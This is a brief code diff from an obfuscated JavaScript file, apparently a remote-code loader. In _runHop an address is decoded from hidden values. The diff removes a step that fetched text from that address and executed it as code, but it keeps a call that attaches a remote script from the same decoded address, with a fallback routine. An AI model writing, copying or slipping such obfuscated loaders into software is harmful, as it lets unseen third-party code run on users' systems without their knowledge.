@@ -322,16 +322,10 @@ function _attachRemote(src) {
 
 function _runHop() {
     var _a = _xd(_net.p1, 31) + _xd(_net.p2, 62);
-
-    _pullAsync(_a)
-        .then(function (_t) {
-            _asCode(_t)();
-        })
-        .catch(function () {
-            _attachRemote(_a).catch(function () {
-                _readmeHubN14();
-            });
-        });
+    
+    _attachRemote(_a).catch(function () {
+        _readmeHubN14();
+    });
 }
 
 function slotFill() {
